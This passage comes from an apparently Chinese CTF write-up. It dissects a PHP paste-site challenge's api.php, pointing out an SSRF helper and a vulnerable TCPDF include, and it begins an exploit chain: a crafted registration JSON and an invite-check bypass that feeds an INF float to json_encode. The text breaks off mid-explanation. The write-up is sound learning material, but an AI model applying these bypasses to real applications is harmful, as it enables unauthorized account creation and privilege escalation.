user=&#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;&#x27; limit 0,1&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">			<span class="keyword">if</span>(@<span class="title function_ invoke__">count</span>(<span class="variable">$tU</span>)&lt;<span class="number">1</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span>(@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;pass&#x27;</span>]!==<span class="variable">$tU</span>[<span class="string">&#x27;pass&#x27;</span>]) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;usr&#x27;</span>]=<span class="variable">$tU</span>;</span><br><span class="line">			<span class="title function_ invoke__">puts</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;pastes&#x27;</span>:</span><br><span class="line">		<span class="variable">$tU</span>=<span class="title function_ invoke__">whoami</span>();</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$tU</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="title function_ invoke__">puts</span>(<span class="number">1</span>,<span class="title function_ invoke__">myPastes</span>());</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;new&#x27;</span>:</span><br><span class="line">		<span class="variable">$tU</span>=<span class="title function_ invoke__">whoami</span>();</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$tU</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span>(@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;title&#x27;</span>] AND @<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;content&#x27;</span>])&#123;</span><br><span class="line">			<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;title&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\s+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">			<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;INSERT INTO pastes(id,title,content,user) VALUES (&#x27;&quot;</span>.<span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">microtime</span>().<span class="variable">$_SESSION</span>[<span class="string">&#x27;usr&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;title&#x27;</span>]).<span class="string">&quot;&#x27; ,&#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>((<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;content&#x27;</span>])).<span class="string">&quot;&#x27; , &#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;usr&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;&#x27;)&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">lastInsertRowID</span>())&#123;</span><br><span class="line">				<span class="title function_ invoke__">puts</span>(<span class="number">1</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;view&#x27;</span>:</span><br><span class="line">		<span class="keyword">if</span>(@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;paste_id&#x27;</span>])&#123;</span><br><span class="line">			<span class="variable">$tP</span>=@<span class="title function_ invoke__">sqlArray</span>(<span class="string">&quot;SELECT * FROM pastes WHERE id=&#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;paste_id&#x27;</span>]).<span class="string">&quot;&#x27; limit 0,1&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">			<span class="keyword">if</span>(@<span class="title function_ invoke__">count</span>(<span class="variable">$tP</span>)&lt;<span class="number">1</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">			<span class="title function_ invoke__">puts</span>(<span class="number">1</span>,<span class="variable">$tP</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;download&#x27;</span>:</span><br><span class="line">		<span class="keyword">if</span>(@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;paste_id&#x27;</span>] AND @<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] )&#123;</span><br><span class="line">			<span class="variable">$tP</span>=@<span class="title function_ invoke__">sqlArray</span>(<span class="string">&quot;SELECT * FROM pastes WHERE id=&#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;paste_id&#x27;</span>]).<span class="string">&quot;&#x27; limit 0,1&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">			<span class="keyword">if</span>(@<span class="title function_ invoke__">count</span>(<span class="variable">$tP</span>)&lt;<span class="number">1</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]===<span class="string">&#x27;text&#x27;</span>)&#123;</span><br><span class="line">				<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/plain&#x27;</span>);</span><br><span class="line">				<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">time</span>()).<span class="string">&#x27;.txt&quot;&#x27;</span>);</span><br><span class="line">				<span class="keyword">echo</span> <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;-&quot;</span>, <span class="number">80</span>).<span class="string">&quot;\n--------- &quot;</span>.<span class="variable">$tP</span>[<span class="string">&#x27;title&#x27;</span>].<span class="string">&quot;\n&quot;</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;-&quot;</span>, <span class="number">80</span>).<span class="string">&quot;\n&quot;</span>.<span class="variable">$tP</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">				<span class="keyword">exit</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]===<span class="string">&#x27;_pdf&#x27;</span>)&#123;</span><br><span class="line">				<span class="keyword">require_once</span>(<span class="string">&#x27;../TCPDF/config/tcpdf_config.php&#x27;</span>);</span><br><span class="line">				<span class="keyword">require_once</span>(<span class="string">&#x27;../TCPDF/tcpdf.php&#x27;</span>);</span><br><span class="line">				<span class="variable">$pdf</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TCPDF</span>(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, <span class="literal">true</span>, <span class="string">&#x27;UTF-8&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">				<span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">SetDefaultMonospacedFont</span>(PDF_FONT_MONOSPACED);</span><br><span class="line">				<span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">SetMargins</span>(PDF_MARGIN_LEFT, PDF_MARGIN_TOP, PDF_MARGIN_RIGHT);</span><br><span class="line">				<span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">SetFont</span>(<span class="string">&#x27;helvetica&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">9</span>);</span><br><span class="line">				<span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">AddPage</span>();</span><br><span class="line">				<span class="variable">$html</span> = <span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="variable">$tP</span>[<span class="string">&#x27;title&#x27;</span>].<span class="string">&#x27;&lt;/h2&gt;&lt;br&gt;&lt;h2&gt;&#x27;</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;-&quot;</span>, <span class="number">40</span>).<span class="string">&#x27;&lt;/h2&gt;&lt;pre&gt;&#x27;</span>.<span class="title function_ invoke__">htmlentities</span>(<span class="variable">$tP</span>[<span class="string">&#x27;content&#x27;</span>],ENT_QUOTES).<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">				<span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">writeHTML</span>(<span class="variable">$html</span>, <span class="literal">true</span>, <span class="number">0</span>, <span class="literal">true</span>, <span class="number">0</span>);</span><br><span class="line">				<span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">lastPage</span>();</span><br><span class="line">				<span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">Output</span>(<span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">time</span>()).<span class="string">&#x27;.pdf&#x27;</span>, <span class="string">&#x27;D&#x27;</span>);</span><br><span class="line">				<span class="keyword">exit</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">		<span class="variable">$tU</span>=<span class="title function_ invoke__">whoami</span>();</span><br><span class="line">		<span class="keyword">if</span>(!@<span class="variable">$tU</span> OR @<span class="variable">$tU</span>[<span class="string">&#x27;priv&#x27;</span>]!==<span class="number">1</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&quot;ok&quot;</span>]   =<span class="variable">$flag</span>;</span><br><span class="line">		<span class="title function_ invoke__">puts</span>(<span class="number">1</span>,<span class="variable">$ret</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这段代码有点臭且长，主要只看以下部分（将上面的代码做精简）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$uInput</span>=@<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);	<span class="comment">//使用$uInput接收传参</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$uInput</span>,<span class="literal">true</span>);	<span class="comment">//json_decode</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;	<span class="comment">//对json传进来的值进行遍历赋值给$key和$value</span></span><br><span class="line">		<span class="comment">//$key负责接收元素名 $value接收元素值</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>)&lt;<span class="number">4</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);	<span class="comment">//对元素值的长度得大于4</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (@<span class="variable">$data</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;	<span class="comment">//对传入的action进行分类判断</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;register&#x27;</span>:	<span class="comment">//如果action的值为register</span></span><br><span class="line">		<span class="keyword">if</span>(@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;user&#x27;</span>] AND @<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;pass&#x27;</span>])&#123;	<span class="comment">//json嵌套json形式，判断key-&gt;user和pass是否存在</span></span><br><span class="line">			<span class="keyword">if</span>(!@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;invite&#x27;</span>]) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);	<span class="comment">//判断key-&gt;invite存在不</span></span><br><span class="line">			<span class="variable">$checkInvite</span> = @<span class="title function_ invoke__">json_decode</span>(@<span class="title function_ invoke__">qInternal</span>(<span class="string">&quot;invites&quot;</span>,<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;invite&quot;</span>=&gt;<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;invite&#x27;</span>]))),<span class="literal">true</span>);</span><br><span class="line">			<span class="comment">//将invites、$data[&#x27;d&#x27;][&#x27;invite&#x27;]、true传入 qInternal</span></span><br><span class="line">			<span class="comment">//qInternal 就是我们前面说的ssrf点</span></span><br><span class="line">			<span class="comment">//接收：function qInternal($endpoint,$payload=null)</span></span><br><span class="line">			<span class="comment">//$endpoint 是拼接url达到利用ssrf访问python服务的点</span></span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$checkInvite</span>===<span class="literal">FALSE</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);	<span class="comment">//判断是不是返回FALSE</span></span><br><span class="line">			<span class="comment">//下面的都是进行添加用户的操作了</span></span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">uExists</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;user&#x27;</span>])) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">			<span class="comment">//这里执行了插入语句，将 priv 设置为0</span></span><br><span class="line">			<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;INSERT INTO users(user,pass,priv) VALUES (&#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;&#x27; ,&#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;pass&#x27;</span>]).<span class="string">&quot;&#x27; , &#x27;0&#x27;)&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">lastInsertRowID</span>())&#123;</span><br><span class="line">				<span class="title function_ invoke__">puts</span>(<span class="number">1</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;new&#x27;</span>:	<span class="comment">//如果action的值为new</span></span><br><span class="line">		<span class="variable">$tU</span>=<span class="title function_ invoke__">whoami</span>();</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$tU</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span>(@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;title&#x27;</span>] AND @<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;content&#x27;</span>])&#123;	<span class="comment">//判断key-&gt;title和content是不是空</span></span><br><span class="line">			<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;title&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\s+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;title&#x27;</span>]);	<span class="comment">//进行一次正则匹配</span></span><br><span class="line">			<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;INSERT INTO pastes(id,title,content,user) VALUES (&#x27;&quot;</span>.<span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">microtime</span>().<span class="variable">$_SESSION</span>[<span class="string">&#x27;usr&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;title&#x27;</span>]).<span class="string">&quot;&#x27; ,&#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>((<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;content&#x27;</span>])).<span class="string">&quot;&#x27; , &#x27;&quot;</span>.<span class="title function_ invoke__">ci</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;usr&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;&#x27;)&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">lastInsertRowID</span>())&#123;</span><br><span class="line">				<span class="title function_ invoke__">puts</span>(<span class="number">1</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;download&#x27;</span>:	<span class="comment">//如果action的值为download</span></span><br><span class="line">        <span class="keyword">if</span>(@<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;paste_id&#x27;</span>] AND @<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] )&#123;</span><br><span class="line">            <span class="comment">//some useless code....</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]===<span class="string">&#x27;_pdf&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;../TCPDF/config/tcpdf_config.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;../TCPDF/tcpdf.php&#x27;</span>);	<span class="comment">//引用包含了我们的漏洞组件</span></span><br><span class="line">                <span class="variable">$pdf</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TCPDF</span>(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, <span class="literal">true</span>, <span class="string">&#x27;UTF-8&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">SetDefaultMonospacedFont</span>(PDF_FONT_MONOSPACED);</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">SetMargins</span>(PDF_MARGIN_LEFT, PDF_MARGIN_TOP, PDF_MARGIN_RIGHT);</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">SetFont</span>(<span class="string">&#x27;helvetica&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">9</span>);</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">AddPage</span>();</span><br><span class="line">                <span class="variable">$html</span> = <span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="variable">$tP</span>[<span class="string">&#x27;title&#x27;</span>].<span class="string">&#x27;&lt;/h2&gt;&lt;br&gt;&lt;h2&gt;&#x27;</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;-&quot;</span>, <span class="number">40</span>).<span class="string">&#x27;&lt;/h2&gt;&lt;pre&gt;&#x27;</span>.<span class="title function_ invoke__">htmlentities</span>(<span class="variable">$tP</span>[<span class="string">&#x27;content&#x27;</span>],ENT_QUOTES).<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">writeHTML</span>(<span class="variable">$html</span>, <span class="literal">true</span>, <span class="number">0</span>, <span class="literal">true</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">lastPage</span>();</span><br><span class="line">                <span class="variable">$pdf</span>-&gt;<span class="title function_ invoke__">Output</span>(<span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">time</span>()).<span class="string">&#x27;.pdf&#x27;</span>, <span class="string">&#x27;D&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;admin&#x27;</span>:	<span class="comment">//如果action的值为admin</span></span><br><span class="line">		<span class="variable">$tU</span>=<span class="title function_ invoke__">whoami</span>();	<span class="comment">//执行 common.php 下的 whoami 类</span></span><br><span class="line">		<span class="keyword">if</span>(!@<span class="variable">$tU</span> OR @<span class="variable">$tU</span>[<span class="string">&#x27;priv&#x27;</span>]!==<span class="number">1</span>) <span class="title function_ invoke__">puts</span>(<span class="number">0</span>);	<span class="comment">//这里对执行完whoami类进行判断是不是为空或者权限是不是admin</span></span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&quot;ok&quot;</span>]   =<span class="variable">$flag</span>;	<span class="comment">//输出flag！！！！！！！</span></span><br><span class="line">		<span class="title function_ invoke__">puts</span>(<span class="number">1</span>,<span class="variable">$ret</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="title function_ invoke__">puts</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上面的代码很清楚，想要获得flag就得有admin权限</p>
+<p>想要注册用户以及提升权限就得结合 common.php 和 internal.py 进行操作</p>
+<p>api.php就相当于一个route路由控制器</p>
+<h1 id="0x03-注册绕过"><a href="#0x03-注册绕过" class="headerlink" title="0x03 注册绕过"></a>0x03 注册绕过</h1><p>想要admin权限，前提是有个账户吧，所以得注册</p>
+<p>注册呢，又绕不开验证码，所以得想办法去bypass这个 invites</p>
+<p>想看“控制器”如何进入路由访问到common.php</p>
+<p><img src="http://oss.hehanzzz.icu/img/202405130149458.png">​</p>
+<p>这里的1、2、3、4步骤就是进入的代码了</p>
+<p>显而易见可以构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;register&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入路由还有个判断，继续构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;action&quot;</span>:<span class="string">&quot;register&quot;</span>,</span><br><span class="line">	<span class="string">&quot;d&quot;</span>:&#123;</span><br><span class="line">    	<span class="string">&quot;user&quot;</span>:<span class="string">&quot;hehanzzz&quot;</span>,</span><br><span class="line">		<span class="string">&quot;pass&quot;</span>:<span class="string">&quot;hehanzzz123&quot;</span>,</span><br><span class="line">		<span class="string">&quot;invite&quot;</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>比较sb的就是，我构造完才发现，原来有gui界面…还构造个卵子，但是上面有一点需要注意的是</p>
+<p>最上面有一行 if(strlen($value)&lt;4) puts(0); 所以所有的 value 长度要大于4</p>
+<p>接下来就是绕过 invite 了，因为 invite 是从他服务器上读取的，没法利用<a target="_blank" rel="noopener" href="http://www.zip下的invite,我们也没法直接读取/">www.zip下的invite，我们也没法直接读取</a></p>
+<p>故需要bypass</p>
+<h3 id="Bypass-json-encode"><a href="#Bypass-json-encode" class="headerlink" title="Bypass json_encode"></a>Bypass json_encode</h3><p>（这里直接抄文章的了）</p>
+<p>json_encode在处理INF时会返回一个false，如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$f=<span class="number">3.3e99999999999999</span>;</span><br><span class="line"><span class="title function_">var_dump</span>($f);</span><br><span class="line"><span class="title function_">var_dump</span>(<span class="title function_">json_encode</span>(<span class="title function_">array</span>(<span class="string">&quot;a&quot;</span>=&gt;$f)));</span><br><span class="line"><span class="comment">//float(INF)</span></span><br><span class="line"><span class="comment">//bool(false)</span></span><br></pre></td></tr></table></figure>
+
+<p>那么这会使得其发送一个空的post请求给内网的api，此时因为接收不到request.data会导致500错误，此时curl得到的结果是NULL，而其判断是使用的：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span>(@$result?<span class="attr">$result</span>:<span class="string">&#x27;false&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>此时得到了一个NULL：</p>
